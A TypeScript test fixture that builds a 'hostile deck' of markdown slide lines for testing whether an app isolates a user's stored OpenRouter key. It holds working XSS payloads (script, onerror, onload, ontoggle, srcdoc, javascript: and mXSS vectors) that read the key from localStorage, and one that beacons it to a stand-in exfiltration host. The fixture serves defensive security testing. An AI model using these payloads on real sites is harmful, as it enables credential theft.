// The hostile deck the key-isolation specs render, shared so every surface faces the same vectors.
//
// Each payload tries to append `<vector>:<key>` to `__byokLeak` on the STUDIO page — through
// `top.opener` when it runs in a popup (the Stage), else `top` — and the image vectors also try a
// beacon to an unroutable host. A surface is safe when the list stays empty.
// (engineering/decisions/2026-11-06-studio-byok-key-lifecycle.md §4, HARD RULE #22.)

/** The canary the specs seed as the OpenRouter key. */
export const SEEDED_KEY = 'sk-or-e2e-isolation-canary';

/** The host the image vectors beacon to; route it in the spec and count hits. */
export const BEACON_HOST = 'https://exfil.invalid';

const leak = (tag: string) => `(top.opener||top).__byokLeak=((top.opener||top).__byokLeak||[]).concat('${tag}:'+localStorage.getItem('lattice-db-or-key'))`;

/** The vectors, as markdown lines (a slide body). */
export const HOSTILE_LINES = [
	`<script>${leak('script')}</script>`,
	`<img src="x" onerror="${leak('img-onerror')};new Image().src='${BEACON_HOST}/?k='+localStorage.getItem('lattice-db-or-key')">`,
	`<svg onload="${leak('svg-onload')}"><circle r="1"/></svg>`,
	`<svg><script>${leak('svg-script')}</script></svg>`,
	`<details open ontoggle="${leak('details-ontoggle')}"><summary>s</summary>x</details>`,
	`<iframe srcdoc="<script>${leak('iframe-srcdoc').replace(/'/g, '&#39;')}</script>"></iframe>`,
	`<style>section{}</style><img src="x" onerror="${leak('after-style')}">`,
	`<object data="javascript:${leak('object')}"></object>`,
	// LAST: the unclosed mXSS nest swallows whatever follows it, so nothing may come after.
	`<math><mtext><table><mglyph><style><img src=x onerror="${leak('mxss')}">`,
];

/** A one-slide hostile deck: a heading and body text the positive controls look for, then the vectors. */
export const HOSTILE = ['# Isolation probe', '', 'Probe body text.', '', ...HOSTILE_LINES.flatMap((l) => [l, ''])].join('\n').trimEnd();
